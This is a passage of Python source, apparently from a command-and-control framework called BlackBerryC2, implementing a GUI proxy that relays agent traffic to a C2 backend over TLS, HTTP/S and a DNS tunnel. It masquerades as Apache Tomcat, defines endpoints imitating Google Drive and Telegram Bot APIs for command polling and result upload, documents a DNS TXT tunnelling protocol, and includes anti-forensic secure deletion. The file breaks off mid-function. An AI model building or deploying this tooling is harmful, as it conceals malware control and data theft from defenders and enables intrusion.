# BlackBerry Proxy GUI v5.3 — TLS · HTTP/S · DNS Bridge
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import logging
import ssl
import socket
import time
import select
from pathlib import Path
from collections import defaultdict, deque
import os
import hashlib
import errno
import json
import secrets
import base64
from queue import Queue, Empty
from http.server import HTTPServer, BaseHTTPRequestHandler
try:
    from bb_profiles import (
        get_active_profile, set_active_profile, get_active_profile_id,
        list_profiles, load_profile, save_profile, delete_profile,
        profile_endpoints_for_proxy, TrafficProfile
    )
    _PROFILES_AVAILABLE = True
except ImportError:
    _PROFILES_AVAILABLE = False
    def get_active_profile(): return None
    def get_active_profile_id(): return "gdrive"
    def list_profiles(): return {"default": "Default"}
    def set_active_profile(pid): return None
    def load_profile(pid): raise ValueError("bb_profiles.py no encontrado")
    def save_profile(pid, d): return ""
    def profile_endpoints_for_proxy(p): return []
from socketserver import ThreadingMixIn
from urllib.parse import urlparse
import struct
import random
from datetime import datetime
import uuid
from colores import *

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes as _crypto_hashes
    _CRYPTO_AVAILABLE = True
except ImportError:
    _CRYPTO_AVAILABLE = False

try:
    import dnslib as _dnslib
    DNSLIB_AVAILABLE = True
except ImportError:
    DNSLIB_AVAILABLE = False
# ============ SILENCIAR LOGS EXTERNOS ============
import warnings
warnings.filterwarnings('ignore')

# Silenciar logs de módulos ruidosos
import logging
logging.getLogger('asyncio').setLevel(logging.CRITICAL)
logging.getLogger('urllib3').setLevel(logging.CRITICAL)
logging.getLogger('PIL').setLevel(logging.CRITICAL)
logging.getLogger('matplotlib').setLevel(logging.CRITICAL)
logging.getLogger('tornado').setLevel(logging.CRITICAL)

BaseHTTPRequestHandler.version_string = lambda self: "Apache Tomcat/10.1.50"


# ============ APACHE TOMCAT SIMULATION ============
TOMCAT_VERSION = "Apache Tomcat/10.1.50"
TOMCAT_SERVER_HEADER = "Apache-Coyote/1.1"

# Páginas HTML típicas de Tomcat
TOMCAT_404_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Apache Tomcat/10.1.50 - Error report</title>
<style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style>
</head>
<body>
<h1>HTTP Status 404 – Not Found</h1>
<hr class="line" />
<p><b>Type</b> Status Report</p>
<p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p>
<hr class="line" />
<h3>Apache Tomcat/10.1.50</h3>
</body>
</html>"""

TOMCAT_MANAGER_401_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Apache Tomcat/10.1.50 - Error report</title>
<style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style>
</head>
<body>
<h1>HTTP Status 401 – Unauthorized</h1>
<hr class="line" />
<p><b>Type</b> Status Report</p>
<p><b>Message</b> Unauthorized</p>
<p><b>Description</b> The request has not been applied because it lacks valid authentication credentials for the target resource.</p>
<hr class="line" />
<h3>Apache Tomcat/10.1.50</h3>
</body>
</html>"""

TOMCAT_ROOT_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Apache Tomcat/10.1.50</title>
<style type="text/css">
body {font-family: Arial, sans-serif;background-color: #F8F8F8;}
h1 {color: #525D76;font-size: 1.8em;padding: 10px 0;border-bottom: 2px solid #525D76;}
.content {margin: 20px;background: white;padding: 20px;border: 1px solid #ddd;border-radius: 5px;}
a {color: #525D76;text-decoration: none;}
a:hover {text-decoration: underline;}
</style>
</head>
<body>
<div class="content">
<h1>Apache Tomcat/10.1.50</h1>
<p>If you're seeing this, you've successfully installed Tomcat. Congratulations!</p>
<ul>
<li><a href="/docs/">Documentation</a></li>
<li><a href="/manager/html">Manager App</a></li>
<li><a href="/host-manager/html">Host Manager</a></li>
</ul>
</div>
</body>
</html>"""


# ============ CONFIGURACIÓN GLOBAL ============
DEFAULT_LISTEN_HOST = '0.0.0.0'
DEFAULT_LISTEN_PORT_TLS = 9948
DEFAULT_LISTEN_PORT_HTTP = 8443
DEFAULT_TARGET_HOST = '127.0.0.1'
DEFAULT_TARGET_PORT = 9949

script_dir = os.path.dirname(os.path.abspath(__file__))
DEFAULT_CERTFILE = f'{script_dir}/cert/BlackBerryC2_Proxy.crt'
DEFAULT_KEYFILE = f'{script_dir}/cert/BlackBerryC2_Proxy.key'
DEFAULT_ICON = f'{script_dir}/icon/server.ico'
BLACKLIST_FILE = f'{script_dir}/blacklist_ips.json'
BUFFER_SIZE = 8192

# Configuración anti-DoS
MAX_ACTIVE_IPS = 50
MAX_CONN_PER_SEC = 20
MAX_CONN_PER_IP = 50
BLACKLIST_DURATION = 7200
RATE_LIMIT_WINDOW = 60

# Protecciones anti-slowhttptest
HTTP_HEADER_TIMEOUT = 60
HTTP_BODY_TIMEOUT = 3600
HTTP_MIN_SPEED = 1
HTTP_MAX_HEADER_SIZE = 16384
TLS_HANDSHAKE_TIMEOUT = 60
CONNECTION_IDLE_TIMEOUT = 86400
HTTP_MAX_REQUESTS_PER_MINUTE = 120


# Keep-alive
HTTP_KEEPALIVE_TIMEOUT = None  # Infinito
HTTP_SESSION_CLEANUP_INTERVAL = 120
KEEPALIVE_TIME = 60
KEEPALIVE_INTVL = 10
KEEPALIVE_PROBES = 3

# Long-polling
LONG_POLL_TIMEOUT = 30  # Mantener conexión abierta hasta 30s
LONG_POLL_CHECK_INTERVAL = 0.5  # Verificar backend cada 0.5s

# Logs
LOG_PROXY_FILE      = f'{script_dir}/logs/BlackBerryC2_ProxyGUI.log'
LOG_PROXY_ENC_FILE  = f'{script_dir}/logs/BlackBerryC2_ProxyGUI_enc.log'
LOG_SERVER_FILE     = f'{script_dir}/logs/BlackBerryC2_Server.log'
LOG_SERVER_ENC_FILE = f'{script_dir}/logs/BlackBerryC2_Server_enc.log'
LOG_DNS_ENC_FILE    = os.path.join(script_dir, "logs", "BlackBerryC2_DNS_enc.log")
TRAFFIC_LOG_FILE    = f'{script_dir}/logs/proxytrafficmonitor.log'
_PROXY_SALT_PATH    = f'{script_dir}/logs/proxy.salt'
_SERVER_SALT_PATH   = f'{script_dir}/logs/server.salt'
_DNS_SALT_PATH      = os.path.join(script_dir, "logs", "dns.salt")

# ── Estado de cifrado del log ─────────────────────────────────────────────
_PROXY_LOG_KEY:  bytes | None = None   # None = sin passphrase / sin cifrado
_SERVER_LOG_KEY: bytes | None = None   # clave AES-256-GCM para logs de servidor
_DNS_LOG_KEY:    bytes | None = None   # clave AES-256-GCM para logs DNS


def _derive_key(passphrase: str, salt: bytes | None = None):
    """Deriva clave AES-256 (PBKDF2, 600k iter, SHA-256). Genérica para todos los logs."""
    if not _CRYPTO_AVAILABLE:
        return None, salt
    if salt is None:
        salt = secrets.token_bytes(16)
    kdf = PBKDF2HMAC(algorithm=_crypto_hashes.SHA256(), length=32,
                     salt=salt, iterations=600_000)
    return kdf.derive(passphrase.encode('utf-8')), salt

# Alias de compatibilidad
_derive_proxy_key = _derive_key


def _log_verify_key(key: bytes, enc_file: str) -> bool:
    """Verifica que la clave desencripta correctamente la primera línea de un log cifrado."""
    if not os.path.isfile(enc_file):
        return True
    with open(enc_file, 'r', encoding='utf-8', errors='replace') as f:
        for line in f:
            line = line.strip()
            if line:
                try:
                    blob = base64.b64decode(line)
                    AESGCM(key).decrypt(blob[:12], blob[12:], None)
                    return True
                except Exception:
                    return False
    return True

def _proxy_log_verify_key(key: bytes) -> bool:
    return _log_verify_key(key, LOG_PROXY_ENC_FILE)


def _decrypt_enc_log(enc_file: str, key: bytes | None) -> list[str]:
    """Lee y descifra un log cifrado AES-256-GCM. Genérico."""
    out = []
    if not os.path.isfile(enc_file):
        return out
    with open(enc_file, 'r', encoding='utf-8', errors='replace') as f:
        for raw in f:
            raw = raw.rstrip()
            if not raw:
                continue
            if key:
                try:
                    blob  = base64.b64decode(raw)
                    plain = AESGCM(key).decrypt(blob[:12], blob[12:], None)
                    out.append(plain.decode('utf-8'))
                except Exception:
                    out.append(f"[ERROR DESCIFRADO] {raw[:60]}…")
            else:
                out.append(raw)
    return out


def _proxy_log_decrypt_lines(path: str) -> list[str]:
    """Lee y descifra el log del proxy."""
    # Si hay clave usar el enc file, si no el plano
    if _PROXY_LOG_KEY and os.path.isfile(LOG_PROXY_ENC_FILE):
        return _decrypt_enc_log(LOG_PROXY_ENC_FILE, _PROXY_LOG_KEY)
    return _decrypt_enc_log(path, None) if not _PROXY_LOG_KEY else []


class _EncryptedLogHandler(logging.Handler):
    """Handler que cifra cada línea con AES-256-GCM. Genérico para cualquier log."""
    def __init__(self, enc_file: str, key_getter):
        super().__init__()
        self._enc_file  = enc_file
        self._key_getter = key_getter  # callable → bytes | None

    def emit(self, record):
        key = self._key_getter()
        if not key or not _CRYPTO_AVAILABLE:
            return
        try:
            msg    = self.format(record)
            nonce  = secrets.token_bytes(12)
            cipher = AESGCM(key).encrypt(nonce, msg.encode('utf-8'), None)
            line   = base64.b64encode(nonce + cipher).decode('ascii')
            with open(self._enc_file, 'a', encoding='utf-8') as f:
                f.write(line + '\n')
        except Exception:
            pass


# ── Tareas válidas — no cambiar ────────────────────────────────────────────
VALID_TASKS = {"handshake", "polling", "upload", "download", "message", "file_transfer"}


def load_custom_endpoints() -> list[dict]:
    """Carga endpoints personalizados persistentes desde disco (con task)."""
    try:
        if os.path.isfile(ENDPOINTS_CUSTOM_FILE):
            with open(ENDPOINTS_CUSTOM_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
            result = []
            for item in data:
                if isinstance(item, dict) and 'path' in item:
                    task = item.get('task', 'message')
                    if task not in VALID_TASKS:
                        task = 'message'
                    result.append({
                        'path': str(item['path']),
                        'task': task,
                        'desc': str(item.get('desc', '')),
                    })
                elif isinstance(item, str):
                    result.append({'path': item, 'task': 'message', 'desc': ''})
            return result if result else HTTP_ENDPOINTS_BASE.copy()
    except Exception:
        pass
    return HTTP_ENDPOINTS_BASE.copy()


def save_custom_endpoints(endpoints: list[dict]) -> bool:
    """Guarda endpoints personalizados en disco de forma persistente."""
    try:
        os.makedirs(os.path.dirname(ENDPOINTS_CUSTOM_FILE), exist_ok=True)
        with open(ENDPOINTS_CUSTOM_FILE, 'w', encoding='utf-8') as f:
            json.dump(endpoints, f, ensure_ascii=False, indent=2)
        return True
    except Exception:
        return False


def _secure_delete(path: str) -> None:
    """Borrado irrecuperable: 3 pasadas aleatorias + 1 de ceros + fsync + unlink."""
    try:
        if not os.path.isfile(path):
            return
        size = os.path.getsize(path)
        if size == 0:
            os.remove(path)
            return
        with open(path, 'r+b') as f:
            for _ in range(3):
                f.seek(0)
                rem = size
                while rem > 0:
                    chunk = min(rem, 65536)
                    f.write(os.urandom(chunk))
                    rem -= chunk
                f.flush(); os.fsync(f.fileno())
            f.seek(0); f.write(b'\x00' * size)
            f.flush(); os.fsync(f.fileno())
        os.remove(path)
    except Exception:
        try: os.remove(path)
        except Exception: pass

# HTTP Endpoints
# ── Tareas disponibles para endpoints (no cambiar los nombres de task) ────────
#  handshake    → Fase 1+2 ECDHE: intercambio de clave con el C2
#  polling      → Long-poll GET: el agente espera comandos
#  upload       → POST de resultados/datos del agente al servidor
#  download     → GET de archivos del servidor al agente
#  message      → POST de mensajes cifrados normales
#  file_transfer→ Transferencia de archivos binarios

# Endpoints con descripción y tarea asignada
HTTP_ENDPOINTS_BASE = [
    {"path": "/handshake",              "task": "handshake",     "desc": "Handshake ECDHE inicial — intercambio de clave con el C2"},
    {"path": "/drive/v3/files",         "task": "download",      "desc": "Polling de comandos — simula API Google Drive (long-poll GET)"},
    {"path": "/upload/drive/v3/files",  "task": "upload",        "desc": "Envío de resultados — simula subida a Google Drive (POST)"},
    {"path": "/api/v1/sync",            "task": "message",       "desc": "Canal de mensajes normales — simula API REST genérica"},
    {"path": "/content/upload",         "task": "file_transfer", "desc": "Transferencia de archivos binarios — PUT/POST al servidor"},
    {"path": "/bot/getUpdates",         "task": "polling",       "desc": "Heartbeat y polling — simula Telegram Bot API"},
]

ENDPOINTS_CUSTOM_FILE = os.path.join(script_dir, 'config', 'custom_endpoints.json')

HTTP_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
]

# ─────────────────────────────────────────────────────────────────────────────
#  DNS C2 BRIDGE  —  Puente PURO  UDP/DNS ↔ TCP/C2-Backend
#
#  Protocolo verificado contra BlackBerryC2_server.py:
#
#  1) C2 acepta TCP → envía banner SSH\r\n
#  2) Proxy envía raw: b"REQUEST_PUBKEY"
#  3) C2 envía raw: b"ECDH_PUBKEY:" + PEM_bytes
#  4) Proxy reenvía al agente DNS (base32 TXT)
#  5) Agente responde [4B len][PEM cliente][32B HMAC]  (opcode h2)
#  6) Proxy envía ese raw al C2 por el mismo socket de h1
#  7) C2 NO responde (el proxy HTTP genera su propio "OK" — mismo aquí)
#  8) Proxy promueve socket a back_sock, arranca reader thread
#  9) dt: agente envía [4B len][cifrado] — proxy reenvía RAW (ya incluye framing)
# 10) po: proxy devuelve [4B len][cifrado] del reader, o WAIT
# 11) hb: proxy envía [4B 0] al back_sock (keepalive vacío) → HB_ACK al agente
#
#  Formato qname:
#    {op2}{cn:02x}{ct:02x}.{sid8}.{lbl1}[.lbl2][.lbl3].{domain}
#  Opcodes: h1 h2 dt po hb
# ─────────────────────────────────────────────────────────────────────────────
_DNS_SCRIPT_DIR  = os.path.dirname(os.path.abspath(__file__))
DNS_DEFAULT_PORT = 53
DNS_DEFAULT_DOMAIN  = "beacon.local"
DNS_LABEL_MAX    = 56     # chars base32 por label (<63)
DNS_TXT_CHUNK    = 200    # chars base32 por registro TXT de respuesta
DNS_FRAG_AGE     = 120    # s → descartar fragmentos huérfanos
DNS_SESSION_TTL  = 3600   # s → limpiar sesión inactiva
LOG_DNS_FILE     = os.path.join(_DNS_SCRIPT_DIR, "logs", "BlackBerryC2_DNS.log")

# Estado global DNS
_dns_sessions:  dict  = {}
_dns_sessions_lock         = threading.Lock()
_dns_srv_sock          = None
_dns_alive:     bool  = False
_dns_log_q: Queue = Queue(maxsize=4096)

# Logger DNS
_dlog = logging.getLogger("BBDNS")
_dlog.setLevel(logging.DEBUG)
try:
    os.makedirs(os.path.dirname(LOG_DNS_FILE), exist_ok=True)
    _dlog_fh = logging.FileHandler(LOG_DNS_FILE, encoding="utf-8")
    _dlog_fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
    _dlog.addHandler(_dlog_fh)
except Exception:
    pass

# Estructuras globales
active_connections = {}
http_sessions = {}
http_sessions_lock = threading.RLock()
connection_stats = defaultdict(lambda: {
    'count': 0, 'last_conn': 0, 'bytes_sent': 0, 'bytes_recv': 0,
    'tls_overhead': 0, 'http_overhead': 0, 'backend_bytes': 0
})
conn_times = defaultdict(lambda: deque(maxlen=100))
blacklist = {}
state_lock = threading.RLock()

# Monitor de tráfico
traffic_monitor_enabled = False
traffic_buffer = deque(maxlen=10000)
traffic_lock = threading.Lock()

# Verbose mode
PROXY_VERBOSE_MODE = 0

# Crear directorios necesarios
os.makedirs(f"{script_dir}/logs", exist_ok=True)
os.makedirs(f"{script_dir}/cert", exist_ok=True)

# ============ LOGGING MEJORADO ============
# Silenciar logs de módulos externos
import logging
logging.getLogger("asyncio").setLevel(logging.CRITICAL)
logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("PIL").setLevel(logging.CRITICAL)

# Logger para proxy
logger = logging.getLogger("ProxyLogger")
logger.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')

file_handler = logging.FileHandler(LOG_PROXY_FILE, encoding='utf-8')
file_handler.setFormatter(formatter)
file_handler.setLevel(logging.DEBUG)
logger.addHandler(file_handler)

console_handler = None


# Handlers cifrados globales
_enc_proxy_handler:  _EncryptedLogHandler | None = None
_enc_server_handler: _EncryptedLogHandler | None = None
_enc_dns_handler:    _EncryptedLogHandler | None = None

# Alias para compatibilidad con código antiguo
_enc_log_handler = None
class _EncryptedProxyLogHandler:
    pass


def _activate_encrypted_logs() -> None:
    """Activa cifrado AES-256-GCM en proxy, server y DNS logs simultáneamente."""
    global _enc_proxy_handler, _enc_server_handler, _enc_dns_handler

    # ── Proxy log ─────────────────────────────────────────────────────────────
    for h in list(logger.handlers):
        if isinstance(h, logging.FileHandler):
            try: h.close()
            except Exception: pass
            logger.removeHandler(h)
    if _enc_proxy_handler is None and _PROXY_LOG_KEY:
        _enc_proxy_handler = _EncryptedLogHandler(LOG_PROXY_ENC_FILE, lambda: _PROXY_LOG_KEY)
        _enc_proxy_handler.setFormatter(formatter)
        _enc_proxy_handler.setLevel(logging.DEBUG)
        logger.addHandler(_enc_proxy_handler)

    # ── Server log ────────────────────────────────────────────────────────────
    for h in list(server_logger.handlers):
        if isinstance(h, logging.FileHandler):
            try: h.close()
            except Exception: pass
            server_logger.removeHandler(h)
    if _enc_server_handler is None and _SERVER_LOG_KEY:
        _enc_server_handler = _EncryptedLogHandler(LOG_SERVER_ENC_FILE, lambda: _SERVER_LOG_KEY)
        _enc_server_handler.setFormatter(formatter)
        _enc_server_handler.setLevel(logging.INFO)
        server_logger.addHandler(_enc_server_handler)

    # ── DNS log ───────────────────────────────────────────────────────────────
    for h in list(_dlog.handlers):
        if isinstance(h, logging.FileHandler):
            try: h.close()
            except Exception: pass
            _dlog.removeHandler(h)
    if _enc_dns_handler is None and _DNS_LOG_KEY:
        _enc_dns_handler = _EncryptedLogHandler(LOG_DNS_ENC_FILE, lambda: _DNS_LOG_KEY)
        _enc_dns_handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
        _enc_dns_handler.setLevel(logging.DEBUG)
        _dlog.addHandler(_enc_dns_handler)


def _activate_encrypted_proxy_log() -> None:
    """Alias de compatibilidad — ahora activa todos los logs."""
    _activate_encrypted_logs()

def set_proxy_verbose_mode(verbose_mode):
    """Configura el modo verbose del proxy."""
    global PROXY_VERBOSE_MODE, console_handler
    
    PROXY_VERBOSE_MODE = verbose_mode
    
    if console_handler:
        logger.removeHandler(console_handler)
        console_handler = None
    
    if verbose_mode == 0:
        logger.debug("Modo SILENCIOSO activado - logs solo en archivo")
    elif verbose_mode == 1:
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.DEBUG)
        console_handler.setFormatter(logging.Formatter('%(levelname)s - %(message)s'))
        logger.addHandler(console_handler)
        logger.debug("Modo DEBUG activado")
    elif verbose_mode == 2:
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        console_handler.setFormatter(logging.Formatter('%(levelname)s - %(message)s'))
        logger.addHandler(console_handler)
        logger.debug("Modo VERBOSE activado")

# Logger para servidor
server_logger = logging.getLogger("ServerLogger")
server_logger.setLevel(logging.INFO)
server_handler = logging.FileHandler(LOG_SERVER_FILE, encoding='utf-8')
server_handler.setFormatter(formatter)
server_logger.addHandler(server_handler)

# Control global
proxy_running = False
server_socket_tls = None
server_socket_http = None
connection_pool = None
session_cleanup_thread = None

proxy_config = {
    'mode': 'both',
    'listen_host_tls': DEFAULT_LISTEN_HOST,
    'listen_port_tls': DEFAULT_LISTEN_PORT_TLS,
    'listen_host_http': DEFAULT_LISTEN_HOST,
    'listen_port_http': DEFAULT_LISTEN_PORT_HTTP,
    'target_host': DEFAULT_TARGET_HOST,
    'target_port': DEFAULT_TARGET_PORT,
    'certfile': DEFAULT_CERTFILE,
    'keyfile': DEFAULT_KEYFILE,
    'endpoints':       [e['path'] for e in load_custom_endpoints()],
    'endpoint_tasks':  {e['path']: e.get('task', 'message') for e in load_custom_endpoints()},
    'use_https': False,
    'dns_enabled': False,
    'dns_port':    DNS_DEFAULT_PORT,
    'dns_domain':  DNS_DEFAULT_DOMAIN,
}

# ============ UTILIDADES ============
def load_blacklist():
    """Carga la blacklist desde archivo."""
    try:
        if os.path.exists(BLACKLIST_FILE):
            with open(BLACKLIST_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                ips = data.get('blocked_ips', [])
                logger.info(f"Blacklist cargada: {len(ips)} IPs")
                return set(ips)
        return set()
    except Exception as e:
        logger.error(f"Error cargando blacklist: {e}")
        return set()

def save_blacklist(ips):
    """Guarda la blacklist en archivo."""
    try:
        data = {
            'blocked_ips': list(ips),
            'last_updated': time.time(),
            'version': '1.0'
        }
        os.makedirs(os.path.dirname(BLACKLIST_FILE), exist_ok=True)
        with open(BLACKLIST_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2)
        logger.info(f"Blacklist guardada: {len(ips)} IPs")
        return True
    except Exception as e:
        logger.error(f"Error guardando blacklist: {e}")
        return False

def log_traffic(direction, proto, ip, data_hex, label=""):
    """Registra tráfico para el monitor."""
    if not traffic_monitor_enabled:
        return
    
    timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
    entry = {
        'timestamp': timestamp,
        'direction': direction,
        'protocol': proto,
        'ip': ip,
        'hex': data_hex,
        'label': label,
        'size': len(data_hex) // 2
    }
    
    with traffic_lock:
        traffic_buffer.append(entry)

def bytes_to_hex(data, max_bytes=256):
    """Convierte bytes a hexadecimal formateado."""
    if len(data) > max_bytes:
        data = data[:max_bytes]
    hex_str = data.hex()
    formatted = ' '.join(hex_str[i:i+32] for i in range(0, len(hex_str), 32))
    return formatted

def format_bytes(bytes_count):
    """Formatea bytes a formato legible."""
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bytes_count < 1024.0:
            return f"{bytes_count:.2f} {unit}"
        bytes_count /= 1024.0
    return f"{bytes_count:.2f} PB"


# ============ RATE LIMITER ============
class RateLimiter:
    def __init__(self):
        self.requests = defaultdict(lambda: deque())
        self.lock = threading.Lock()
    
    def is_allowed(self, ip):
        now = time.time()
        with self.lock:
            times = self.requests[ip]
            while times and now - times[0] > RATE_LIMIT_WINDOW:
                times.popleft()
            
            if len(times) >= HTTP_MAX_REQUESTS_PER_MINUTE:
                logger.warning(f"Rate limit excedido para {ip}")
                return False
            
            times.append(now)
            return True
    
    def cleanup(self):
        now = time.time()
        with self.lock:
            to_remove = []
            for ip, times in self.requests.items():
                while times and now - times[0] > RATE_LIMIT_WINDOW:
                    times.popleft()
                if not times:
                    to_remove.append(ip)
            for ip in to_remove:
                del self.requests[ip]

# ============ CONNECTION TRACKER ============
class ConnectionTracker:
    def __init__(self):
        self.connections = defaultdict(set)
        self.lock = threading.Lock()
    
    def add(self, ip, conn_id):
        with self.lock:
            self.connections[ip].add(conn_id)
    
    def remove(self, ip, conn_id):
        with self.lock:
            if ip in self.connections:
                self.connections[ip].discard(conn_id)
                if not self.connections[ip]:
                    del self.connections[ip]
    
    def count(self, ip):
        with self.lock:
            return len(self.connections.get(ip, set()))
    
    def is_allowed(self, ip):
        count = self.count(ip)
        if count >= MAX_CONN_PER_IP:
            logger.warning(f"Máximo de conexiones alcanzado para {ip}: {count}")
            return False
        return True

# Instancias globales de protección
rate_limiter = RateLimiter()
connection_tracker = ConnectionTracker()


# ============ POOL DE CONEXIONES ============
class BackendConnectionPool:
    """Pool de conexiones al backend C2."""
    
    def __init__(self, target_host, target_port, apply_socket_opts):
        self.target_host = target_host
        self.target_port = target_port
        self.apply_socket_opts = apply_socket_opts
        self.pool_lock = threading.Lock()
        self.running = False
        self.stats = {'total_created': 0, 'total_failed': 0}
    
    def start(self):
        self.running = True
        logger.info(f"Pool iniciado: {self.target_host}:{self.target_port}")
    
    def stop(self):
        self.running = False
        logger.info("Pool detenido")
    
    def _create_connection(self):
        """Crea una nueva conexión al backend."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.apply_socket_opts(sock)
            sock.settimeout(10.0)
            sock.connect((self.target_host, self.target_port))
            sock.settimeout(None)
            
            if sock.fileno() <= 0:
                logger.error("Socket creado con fileno inválido")
                return None
            
            self.stats['total_created'] += 1
            logger.debug(f"Nueva conexión backend: fd={sock.fileno()}")
            return sock
        except Exception as e:
            self.stats['total_failed'] += 1
            logger.error(f"Error creando conexión backend: {e}")
            return None
    
    def get_connection(self):
        """Obtiene una conexión del pool."""
        if not self.running:
            return None
        return self._create_connection()
    
    def close_connection(self, conn):
        """Cierra una conexión de forma segura."""
        if not conn:
            return
        try:
            conn.shutdown(socket.SHUT_RDWR)
        except:
            pass
        try:
            conn.close()
        except:
            pass

# ============ FUNCIONES AUXILIARES ============
def apply_advanced_socket_options(sock):
    """Aplica opciones avanzadas al socket."""
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        if hasattr(socket, 'TCP_KEEPIDLE'):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, KEEPALIVE_TIME)
        if hasattr(socket, 'TCP_KEEPINTVL'):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, KEEPALIVE_INTVL)
        if hasattr(socket, 'TCP_KEEPCNT'):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, KEEPALIVE_PROBES)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except Exception as e:
        logger.warning(f"Error aplicando opciones de socket: {e}")

def is_connection_allowed(ip, port, blocked_ips):
    """Verifica si una conexión está permitida."""
    now = time.time()
    with state_lock:
        if ip in blocked_ips:
            return False, "IP bloqueada"
        if ip in blacklist and blacklist[ip] > now:
            return False, "IP en blacklist temporal"
        
        stats = connection_stats[ip]
        active_count = len(active_connections.get(ip, []))
        if active_count >= MAX_CONN_PER_IP:
            return False, "Máximo conexiones por IP"
        
        times = conn_times[ip]
        times.append(now)
        while times and now - times[0] > RATE_LIMIT_WINDOW:
            times.popleft()
        
        if len(times) > MAX_CONN_PER_SEC * RATE_LIMIT_WINDOW:
            blacklist[ip] = now + BLACKLIST_DURATION
            return False, "Rate limit excedido"
        
        stats['count'] += 1
        stats['last_conn'] = now
        return True, "OK"

def register_connection(ip, conn):
    """Registra una conexión activa."""
    with state_lock:
        if ip not in active_connections:
            active_connections[ip] = []
        active_connections[ip].append(conn)

def unregister_connection(ip, conn):
    """Desregistra una conexión activa."""
    with state_lock:
        if ip in active_connections:
            try:
                active_connections[ip].remove(conn)
                if not active_connections[ip]:
                    del active_connections[ip]
            except ValueError:
                pass

# ============ SESIÓN HTTP ============
class HTTPSession:
    """Sesión HTTP con conexión backend persistente y cola de mensajes - con UUID."""
    
    def __init__(self, ip, session_id=None):
        self.session_id = session_id or str(uuid.uuid4())  # ID único por sesión
        self.ip = ip
        self.backend_sock = None
        self.last_activity = time.time()
        self.lock = threading.Lock()
        self.handshake_complete = False
        self.reconnect_attempted = False
        self.encrypted_aes_key = None
        self.pubkey_data = None
        self.closed = False  # Flag para evitar operaciones en sesiones cerradas
        
        # Cola de mensajes pendientes del backend
        self.pending_messages = deque(maxlen=100)
        self.message_lock = threading.Lock()
        
        # Thread de lectura del backend
        self.reader_thread = None
        self.reader_stop_event = threading.Event()
        
        # Estado de transferencia de archivos
        self.file_transfer_active = False
        self.file_chunks = deque()
        self.file_transfer_lock = threading.Lock()

        # Socket dedicado para el handshake en curso (FASE 1 → FASE 2)
        # Se guarda separado para que FASE 2 no use la lógica de reconexión
        self._hs_sock = None
        self._hs_lock = threading.Lock()
    
    def update_activity(self):
        with self.lock:
            self.last_activity = time.time()
    
    def is_expired(self):
        return False  # Keep-alive infinito
    
    def _is_socket_valid(self, sock):
        """Verifica si un socket es válido - CORREGIDO."""
        if not sock or self.closed:
            return False
        try:
            fd = sock.fileno()
            if fd <= 0:
                return False
            _, _, err = select.select([], [sock], [sock], 0)
            if err:
                return False
            return True
        except (OSError, ValueError):
            return False
    
    def _start_reader_thread(self):
        """Inicia el thread que lee del backend."""
        if self.reader_thread and self.reader_thread.is_alive():
            return
        
        self.reader_stop_event.clear()
        self.reader_thread = threading.Thread(
            target=self._backend_reader_loop,
            daemon=True
        )
        self.reader_thread.start()
        logger.debug(f"Reader thread iniciado para {self.ip}")
    
    def _backend_reader_loop(self):
        """Loop que lee mensajes del backend y los encola."""
        while not self.reader_stop_event.is_set():
            try:
                with self.lock:
                    if not self._is_socket_valid(self.backend_sock):
                        break
                    sock = self.backend_sock
                
                # Verificar si hay datos disponibles
                ready, _, _ = select.select([sock], [], [], 1.0)
                
                if not ready:
                    continue
                
                # Leer longitud del mensaje
                sock.settimeout(5.0)
                len_bytes = self._recv_exact(sock, 4)
                
